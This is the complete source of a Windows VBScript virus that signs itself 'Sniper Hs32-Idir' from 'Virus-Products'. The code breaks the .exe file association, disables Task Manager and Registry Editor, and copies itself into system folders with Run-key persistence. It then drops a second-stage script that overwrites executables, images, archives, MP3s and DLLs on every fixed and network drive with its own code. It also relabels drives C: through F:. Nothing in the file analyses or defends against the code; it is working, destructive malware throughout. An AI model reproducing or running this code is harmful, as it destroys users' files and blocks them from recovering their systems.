'Please dont edit this script... System will corrupt, if System will corrupt... PC will affect and will not run correctly. thanks Hs32-Idir-Bey
'Author :Hs32-Idir by V-P.
'Virus Name :Sniper Hs32-Idir.
'Company Name :Virus-Products.
'Version Info :0.0.0001.
ON ERROR RESUME NEXT
Const HKEY_CLASSES_ROOT = &H80000000
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & _
strComputer & "\root\default:StdRegProv")
strKeyPath = ".exe"
strStringValueName = ""
oReg.DeleteValue HKEY_CLASSES_ROOT,strKeyPath,strStringValueName

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
set objRefresher = CreateObject("WbemScripting.SWbemRefresher")
Set colCache = objRefresher.AddEnum _
(objWMIService, "win32_PerfFormattedData_PerfOS_Cache").ObjectSet
objRefresher.Refresh
For i = 1 to 500
Rem           ******    ********     ******    ********
Rem             **        **    *      **       **     *
Rem             **        **     *     **       **     *
Rem             **        **     *     **       **   *
Rem             **        **     *     **       **    *
Rem             **        **    *      **       **     *
Rem           ******    ********     ******     **     *
Rem This*VBs*CREATE*BY*HIESSDAISR*EMAIL*VRS_Idir@yahoo.fr
Rem                     _.--"""""--._
Rem                   .'            '
Rem                  / Virus Production\
Rem                 ; VRS_Idir@Yahoo.fr ;
Rem                 |   Create by HS32  |
Rem                 |       IDIR        |
Rem                 ;                   ;
Rem                 \ (`'--,    ,--'`) /
Rem                  \ \  _ )  ( _  / /
Rem                   ) )(')/  \(')( (
Rem                  (_ `""` /\ `""` _)
Rem                   \`"-, /  \ ,-"`/
Rem         (@_        `\ / `""` \ /`
Rem    _     ) \________|/\/\/\/\/\|_________________________
Rem   (_)@8@8{}<________|\        /|__________________________>
Rem          )_/        ; |/\/\/\| ;
Rem         (@           \`-`--`-`/
Rem                       \      /
Rem                        ',__,'
Rem                         q__p
Rem                         q__p
Rem This*VBs*CREATE*BY*HIESSDAISR*EMAIL*VRS_Idir@yahoo.fr
ON ERROR RESUME NEXT
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\default")
Set objItem = objWMIService.Get("SystemRestore")
errResults = objItem.Enable("")
ON ERROR RESUME NEXT
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & _ 
strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
strValueName = "DisableRegistryTools"
dwValue = 1
oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue
ON ERROR RESUME NEXT
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1"
Set WshShell = Nothing
DIM IDIRVRSPRO,IBAHLAL,THAMAZIRTH,TIZIWOUZOU,VBNIKE
SET IDIRVRSPRO = CREATEOBJECT("SCRIPTING.FILESYSTEMOBJECT")
SET HSIDIR = IDIRVRSPRO.OpenTextFile(WScript.ScriptFullName,1)
VBNIKE=HSIDIR.READALL
SET IBAHLALBAS = IDIRVRSPRO.GetSpecialFolder(0)
SET THAMAZIRTH = IDIRVRSPRO.GetSpecialFolder(1)
SET TIZIWOUZOU = IDIRVRSPRO.GetSpecialFolder(2)
SET LNI = IDIRVRSPRO.GetFile(WScript.ScriptFullName)
DONTCREATE()
              Wscript.Sleep 2000
           objRefresher.Refresh
Next
SUB DONTCREATE
ON ERROR RESUME NEXT
LNI.Copy(TIZIWOUZOU&"\RUNMACHINE.DLL.VBS")
ACTIVATEPC()
IMPORTENTFILE()
END Sub
SUB ACTIVATEPC
ON ERROR RESUME NEXT
REGSNIPER "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Run\VIRUSPRODUCTS",IBAHLALBAS&"\WscriptConfiguration.Vbs"
REGSNIPER "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run\MicrosoftWin32",TIZIWOUZOU&"\RUNMACHINE.DLL.VBS"
REGSNIPER "HKEY_CLASSES_ROOT\.exe\shell\open\command\\",IBAHLALBAS&"\Explorer.exe"
END SUB
SUB REGSNIPER(Regvalue,Regkey)
Set PCINFORMATION=CreateObject("Wscript.Shell")
PCINFORMATION.RegWrite Regvalue,Regkey
END SUB
SUB IMPORTENTFILE
ON ERROR RESUME NEXT
DIM VIRUSPRODUCTS,S,DIR1,DIR2,HS
DIR1="Rem           ******    ********     ******    ********"&vbcrlf& _
"Rem             **        **    *      **       **     *"&vbcrlf& _
"Rem             **        **     *     **       **     *"&vbcrlf& _
"Rem             **        **     *     **       **   *"&vbcrlf& _
"Rem             **        **     *     **       **    *"&vbcrlf& _
"Rem             **        **    *      **       **     *"&vbcrlf& _
"Rem           ******    ********     ******     **     *"&vbcrlf& _
"Rem This*VBs*CREATE*BY*HIESSDAISR*EMAIL*VRS_Idir@yahoo.fr"&vbcrlf& _
"Rem                     _.--""""""""""--._"&vbcrlf& _
"Rem                   .'             '."&vbcrlf& _
"Rem                  / Virus Production\"&vbcrlf& _
"Rem                 ; VRS_Idir@Yahoo.fr ;"&vbcrlf& _
"Rem                 |   Create by HS32  |"&vbcrlf& _
"Rem                 |       IDIR        |"&vbcrlf& _
"Rem                 ;                   ;"&vbcrlf& _
"Rem                 \ (`'--,    ,--'`) /"&vbcrlf& _
"Rem                  \ \  _ )  ( _  / /"&vbcrlf& _
"Rem                   ) )(')/  \(')( ("&vbcrlf& _
"Rem                  (_ `""""` /\ `""""` _)"&vbcrlf& _
"Rem                   \`""""-, /  \ ,-""""`/"&vbcrlf& _
"Rem         (@_        `\ / `""""` \ /`"&vbcrlf& _
"Rem    _     ) \________|/\/\/\/\/\|_________________________"&vbcrlf& _
"Rem   (_)@8@8{}<________|\        /|__________________________>"&vbcrlf& _
"Rem          )_/        ; |/\/\/\| ;"&vbcrlf& _
"Rem         (@           \`-`--`-`/"&vbcrlf& _
"Rem                       \      /"&vbcrlf& _
"Rem                        ',__,'"&vbcrlf& _
"Rem                         q__p"&vbcrlf& _
"Rem                         q__p"&vbcrlf& _
"Rem ThisVBsCREATEBYHSIDIREMAILVRS_Idir@yahoo.fr"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"strComputer = @-@.@-@"&vbcrlf& _
"Set objWMIService = GetObject(@-@winmgmts:@-@ _"&vbcrlf& _
" & @-@{impersonationLevel=impersonate}!\\@-@ & strComputer & @-@\root\default@-@)"&vbcrlf& _
"Set objItem = objWMIService.Get(@-@SystemRestore@-@)"&vbcrlf& _
"errResults = objItem.Enable(@-@@-@)"&vbcrlf& _
"strComputer = @-@.@-@"&vbcrlf& _
"Set objWMIService = GetObject(@-@winmgmts:@-@ _"&vbcrlf& _
  "& @-@{impersonationLevel=impersonate}!\\@-@ & strComputer & @-@\root\cimv2@-@)"&vbcrlf& _
  ""&vbcrlf& _
"set objRefresher = CreateObject(@-@WbemScripting.SWbemRefresher@-@)"&vbcrlf& _
"Set colCache = objRefresher.AddEnum _"&vbcrlf& _
    "(objWMIService, @-@win32_PerfFormattedData_PerfOS_Cache@-@).ObjectSet"&vbcrlf& _
"objRefresher.Refresh"&vbcrlf& _
""&vbcrlf& _
"For i = 1 to 500"&vbcrlf& _
""&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"DIM IDIRVRSPRO,IBAHLAL,THAMAZIRTH,TIZIWOUZOU,SPEED,KLMT,VBNIKE"&vbcrlf& _
"SPEED=@-@@-@"&vbCrLf&_
"KLMT=0"&vbCrLf&_
"SET IDIRVRSPRO = CREATEOBJECT(@-@SCRIPTING.FILESYSTEMOBJECT@-@)"&vbcrlf& _
"SET HSIDIR = IDIRVRSPRO.OpenTextFile(WScript.ScriptFullName,1)"&vbcrlf& _
"VBNIKE=HSIDIR.READALL"&vbcrlf& _
"SET IBAHLALBAS = IDIRVRSPRO.GetSpecialFolder(0)"&vbcrlf& _
"SET THAMAZIRTH = IDIRVRSPRO.GetSpecialFolder(1)"&vbcrlf& _
"SET TIZIWOUZOU = IDIRVRSPRO.GetSpecialFolder(2)"&vbcrlf& _
"SET LNI = IDIRVRSPRO.GetFile(WScript.ScriptFullName)"&vbcrlf& _
"DONTCREATE()"&vbcrlf& _
"Wscript.Sleep 2000"&vbcrlf& _
"objRefresher.Refresh"&vbcrlf& _
"Next"&vbcrlf& _
"SUB DONTCREATE"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"LNI.Copy(THAMAZIRTH&@-@\PageFileConfiguration.Vbs@-@)"&vbcrlf& _
"RENEKRUNS()"&vbcrlf& _
"TOUTMAISONS()"&vbcrlf& _
"END SUB"&vbcrlf& _
"SUB RENEKRUNS"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"NIKEREG @-@HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftWin32@-@,THAMAZIRTH&@-@\PageFileConfiguration.Vbs@-@"&vbcrlf&_
"END SUB "&vbcrlf& _
"SUB NIKEREG(regkey,regvalue)"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"SET VIRUSPRODUCTS = CREATEOBJECT(@-@wscript.shell@-@)"&vbcrlf& _
"VIRUSPRODUCTS.RegWrite regkey,regvalue"&vbcrlf& _
"END SUB"&vbcrlf& _
"SUB DOSIER(VBVIRUS)"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"DIM S,BOLID,MAISONS"&vbcrlf& _
"SET S = IDIRVRSPRO.GetFolder(VBVIRUS)"&vbcrlf& _
"SET MAISONS = S.SubFolders"&vbcrlf& _
"FOR EACH BOLID IN MAISONS"&vbcrlf& _
"NIKYTOUT(BOLID.path)"&vbcrlf& _
"DOSIER(BOLID.path)"&vbcrlf& _
"NEXT"&vbcrlf& _
"END SUB"&vbcrlf& _
"SUB TOUTMAISONS"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"DIM PIDI,VILLAGE,D"&vbcrlf& _
"SET VILLAGE = IDIRVRSPRO.Drives"&vbcrlf& _
"FOR EACH PIDI IN VILLAGE"&vbcrlf& _
"IF PIDI.DriveType = 2 OR PIDI.DriveType = 3 THEN"&vbcrlf& _
"DOSIER(PIDI.path&@-@\@-@)"&vbcrlf& _
"END IF"&vbcrlf& _
"NEXT"&vbcrlf& _
"TOUTMAISONS = D"&vbcrlf& _
"END SUB"&vbcrlf& _
"SUB NIKYTOUT(VBVIRUS)"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"DIM VRS,VIRUS,SYSTEM,FILEDONTDELET,MERCI,DRIENIHERCHEN,APRES,VIRUSVBSCRIPT"&vbcrlf& _
"SET VRS = IDIRVRSPRO.GetFolder(VBVIRUS)"&vbcrlf& _
"SET SYSTEM = VRS.Files"&vbcrlf& _
"FOR EACH VIRUS IN SYSTEM"&vbcrlf& _
"FILEDONTDELET=IDIRVRSPRO.GetExtensionName(VIRUS.path)"&vbcrlf& _
"FILEDONTDELET=LCASE(FILEDONTDELET)"&vbcrlf& _
"DRIENIHERCHEN=LCASE(VIRUS.name)"&vbcrlf& _
"IF (FILEDONTDELET=@-@exe@-@) or (FILEDONTDELET=@-@jpg@-@) or (FILEDONTDELET=@-@bmp@-@) or (FILEDONTDELET=@-@rar@-@) or (FILEDONTDELET=@-@zip@-@) or (FILEDONTDELET=@-@nrg@-@) or (FILEDONTDELET=@-@bat@-@) or (FILEDONTDELET=@-@mp3@-@) or (FILEDONTDELET=@-@dll@-@) or (FILEDONTDELET=@-@cpl@-@) THEN"&vbcrlf& _
"SET MERCI=IDIRVRSPRO.OpenTextFile(VIRUS.path,2,TRUE)"&vbcrlf& _
"MERCI.AtEndOfLine VBNIKE"&vbcrlf& _
"MERCI.CLOSE"&vbcrlf& _
"END IF"&vbcrlf& _
"IF (SPEED<>VBVIRUS) THEN"&vbcrlf& _
"END IF"&vbcrlf& _
"NEXT"&vbcrlf& _
"END Sub"&vbcrlf& _
"ON ERROR RESUME NEXT"&vbcrlf& _
"CONST DEVICE_DRIVER_INSTALL = 10"&vbcrlf& _
"CONST BEGIN_SYSTEM_CHANGE = 100"&vbcrlf& _
"strComputer = @-@.@-@"&vbcrlf& _
"Set objWMIService = GetObject(@-@winmgmts:@-@ _"&vbcrlf& _
" & @-@{impersonationLevel=impersonate}!\\@-@ & strComputer & @-@\root\default@-@)"&vbcrlf& _
"Set objItem = objWMIService.Get(@-@SystemRestore@-@)"&vbcrlf& _
"errResults = objItem.CreateRestorePoint _"&vbcrlf& _
"(@-@Point De verification Du System Create by Hs Idir@-@, DEVICE_DRIVER_INSTALL, BEGIN_SYSTEM_CHANGE)"&vbcrlf& _
""
HS1=replace(DIR1,chr(35)&chr(45)&chr(35),"'")
HS1=replace(HS1,chr(64)&chr(45)&chr(64),"""")
set HIDIRS=IDIRVRSPRO.CreateTextFile(IBAHLALBAS+"\WscriptConfiguration.Vbs")
HIDIRS.close
set H3S5A5=IDIRVRSPRO.OpenTextFile(IBAHLALBAS+"\WscriptConfiguration.Vbs",2)
H3S5A5.write HS1
H3S5A5.write vbcrlf
H3S5A5.close
END SUB
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colDrives = objWMIService.ExecQuery _
   ("Select * from Win32_LogicalDisk where DeviceID = 'C:'")

For Each objDrive in colDrives
    objDrive.VolumeName = "HS32.IDIR Virus Production-2007"
  objDrive.Put_
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colDrives = objWMIService.ExecQuery _
    ("Select * from Win32_LogicalDisk where DeviceID = 'D:'")

For Each objDrive in colDrives
   objDrive.VolumeName = "HS32.IDIR Virus Production-2007"
 objDrive.Put_
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colDrives = objWMIService.ExecQuery _
  ("Select * from Win32_LogicalDisk where DeviceID = 'E:'")

For Each objDrive in colDrives
objDrive.VolumeName = "HS32.IDIR Virus Production-2007"
objDrive.Put_
Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colDrives = objWMIService.ExecQuery _
("Select * from Win32_LogicalDisk where DeviceID = 'F:'")

For Each objDrive in colDrives
   objDrive.VolumeName = "HS32.IDIR Virus Production-2007"
    objDrive.Put_
Next
Rem           ******    ********     ******    ********
Rem             **        **    *      **       **     *
Rem             **        **     *     **       **     *
Rem             **        **     *     **       **   *
Rem             **        **     *     **       **    *
Rem             **        **    *      **       **     *
Rem           ******    ********     ******     **     *
              Wscript.Sleep 2
        objRefresher.Refresh
'This is simple but this is a Good
